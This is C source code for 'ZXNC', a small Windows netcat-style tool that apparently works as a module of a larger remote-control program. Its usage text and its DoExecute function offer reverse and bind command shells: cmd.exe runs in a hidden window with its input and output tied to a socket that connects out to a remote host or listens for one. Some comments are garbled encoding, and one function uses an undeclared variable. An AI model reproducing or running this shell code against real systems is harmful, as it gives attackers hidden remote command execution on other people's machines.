//Version: 1.1
//Code By LZX
//Last Modified: 2006-07-30
#include <winsock2.h>
#include <stdio.h>
#include <CONIO.H>
#include <IO.H>
#include <errno.h>
#include <iostream.h>
#pragma comment(lib,"ws2_32.lib")
#define MAXBUFSIZE		8192
BYTE ConnType=0, EndFlag=0, DBL=0, Ext=0;
char END[4][5] = {"\n", "\r\n", "\n\n", "\r\n\r\n" };
char *CMD = "\0";

void Usage(SOCKET Socket)
{
	char *Usage = ""
		"ZXNC v1.1 - simple telnet client\r\n"
		"Code by LZX.\r\n\r\n"

		"Usage:  %s [-l -f -t -e <cmd>] [-h <IP>] [-p <Port>]\r\n"
		"Example:\r\n"
		"\tZXNC x.x.x.x 80\r\n"
		"\tZXNC -f -d www.163.com 80\r\n"
		"\tZXNC -l -p 99\r\n"
		"\tZXNC -e cmd.exe x.x.x.x 99 (send a cmdshell)\r\n"
		"\tZXNC -e cmd.exe -l -p 99 (bind a cmdshell)\r\n"
		"args: [-l -e -f -t]\r\n"
		"\t-e inbound program to exec\r\n"
		"\t-l listen mode, for inbound connects\r\n"
		"\t-f change the end sign to \\r\\n, default is \\n\\r\n"
		"\t-d twice ENTER to send a line, default is per ENTER.\r\n";
	SendMessage(Socket, Usage);
}

char *DNS(char *HostName)
{
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	hostent = gethostbyname(HostName);
	if (hostent == NULL)
	{
		return NULL;
	}
	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	return inet_ntoa(iaddr);
}

SOCKET ConnectRemote(char *HostName,const WORD Port)
{
	struct sockaddr_in Server;
	SOCKET sock;
	memset(&Server, 0, sizeof(Server));

	Server.sin_family = AF_INET;
	Server.sin_port = htons(Port);
	if (inet_addr(HostName) != INADDR_NONE)
		Server.sin_addr.s_addr = inet_addr(HostName);
	else
	{
		if (DNS(HostName) != NULL)
			Server.sin_addr.s_addr = inet_addr(DNS(HostName));
		else
			return 0;
	}

	sock = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if(sock == INVALID_SOCKET)
		return 0;

	if(connect(sock, (const SOCKADDR *)&Server,sizeof(Server)) == SOCKET_ERROR)
	{
		closesocket(sock);
		return 0;
	}

	return sock;
}

SOCKET DoAccept(SOCKET s, int nTimeOut)
{
	int iMode = 1;//nonzero
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);//Enabled Nonblocking Mode

	struct timeval TimeOut;
	fd_set FdRead;
	FD_ZERO(&FdRead);
	FD_SET(s,&FdRead);
	FD_SET(Socket,&FdRead);

	TimeOut.tv_sec  = nTimeOut;//12 sec
	TimeOut.tv_usec = 0;
	if(select(0, &FdRead, NULL, NULL, nTimeOut==-1 ? NULL : &TimeOut) <= 0)//����accept��ʱ
		return 0;

	return accept(s, NULL, NULL);
}

SOCKET LocalBind(const WORD Port)
{

	struct sockaddr_in Local;
	SOCKET sock;
	SOCKET Accepts = INVALID_SOCKET;
	memset(&Local, 0, sizeof(Local));

	Local.sin_family = AF_INET;
	Local.sin_port = htons(Port);
	Local.sin_addr.s_addr = 0;


	sock = WSASocket(PF_INET, SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	if(sock == INVALID_SOCKET)
		return 0;
	if(bind(sock, (const SOCKADDR *)&Local,sizeof(Local)) == SOCKET_ERROR)
		goto error;
	if(listen(sock, 0) == SOCKET_ERROR)
		goto error;
	Accepts = DoAccept(sock, 60);
	if(Accepts <= 0)
		goto error;

	return Accepts;
error:
	closesocket(sock);
	return 0;
}

void DoExecute(SOCKET sock, char *cmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si,0,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;//
	si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)sock;
	CreateProcess(NULL,cmd,NULL,NULL,TRUE,0,0,NULL,&si,&pi);
}

void TransmitCMD(SOCKET sock)
{
	int nRecv=0, result, len;
	char SendBuf[MAXBUFSIZE], RecvBuf[MAXBUFSIZE+1];

	fd_set ReadFD,WriteFD;
	struct timeval timeset;
	timeset.tv_sec = 60;
	timeset.tv_usec = 0;

	while(1)
	{
		FD_ZERO(&ReadFD);
		FD_ZERO(&WriteFD);
		FD_SET((UINT)sock, &ReadFD);
		FD_SET((UINT)sock, &WriteFD);
		result=select(sock+1,&ReadFD, &WriteFD, NULL, &timeset);
		if(result <= 0)
			break;
		if(FD_ISSET(sock, &ReadFD))
		{
			nRecv = recv(sock, RecvBuf, MAXBUFSIZE, 0);
			if(nRecv <= 0)
				break;
			RecvBuf[nRecv] = '\0';
			for(int i=0; i<nRecv; i++)
				putchar(RecvBuf[i]);
//			result = printf("%s", RecvBuf+1);

		}
		if(FD_ISSET(sock, &WriteFD))
		{
			if(kbhit())
			{
				len = 0;
				SendBuf[0] = '\0';
				while(!strstr(SendBuf, END[EndFlag+(DBL?2:0)]))
				{
					gets(SendBuf+len);
					strcat(SendBuf, END[EndFlag]);
					len = strlen(SendBuf);
				}
				result = send(sock, SendBuf, len,0);
				if(result <= 0)
					break;
			}
			Sleep(5);
		}
	}
}
int ZXNC(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	WORD Port=0;
	char *HostIP = "\0";

	if(argc < 3)
	{
		Usage(Socket);
		return 1;
	}
	HostIP = argv[argc-2];
	Port = atoi(argv[argc-1]);
	//��ȡ���� start
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			switch(argv[i][1])
			{
			case 'l':
				ConnType = 1; //Local
				break;
			case 'f':
				EndFlag = 1;
				break;
			case 'd':
				DBL = 1;
				break;
			continue;
			}
		}
		else
		{
			if(i==1) continue;
			switch(argv[i-1][1])
			{
			case 'h':
				HostIP = argv[i];
				break;
			case 'p':
				Port = atoi(argv[i]);
				break;
			case 'e':
				Ext = 1;
				CMD = argv[i];
				break;
			}
		}
	}//end

	WSADATA wd;
	SOCKET sock;
	if(WSAStartup(MAKEWORD(2,2),&wd))
		return 1;
	if(ConnType == 0)//��������
		sock = ConnectRemote(HostIP, Port);
	else			//���ؼ���
		sock = LocalBind(Port);
	if(sock == 0)
		goto exit;
	if(Ext)			//��һ��shell
	{
		DoExecute(sock, CMD);
		goto exit;
	}
	TransmitCMD(sock);//��������

exit:
	WSACleanup();

	closesocket(sock);
	return 0;
}